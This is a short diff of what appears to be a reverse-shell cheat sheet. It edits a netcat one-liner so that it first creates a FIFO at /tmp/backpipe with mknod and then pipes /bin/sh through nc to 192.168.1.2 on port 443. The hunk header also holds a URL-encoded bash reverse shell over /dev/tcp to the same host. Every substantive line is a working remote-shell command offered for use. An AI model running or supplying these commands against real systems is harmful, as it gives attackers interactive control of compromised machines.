@@ -117,8 +117,9 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%
 
 >credits: UnD3sc0n0c1d0
 
-```cmd
-/bin/sh 0</tmp/backpipe | nc 192.168.1.2 443 1>/tmp/backpipe
+```sh
+mknod /tmp/backpipe p                                          # 1) create FIFO pipe (pipeline)
+/bin/sh 0</tmp/backpipe | nc 192.168.1.2 443 1>/tmp/backpipe   # 2) reverse shell
 ```
 
 # <kbd>-e</kbd>
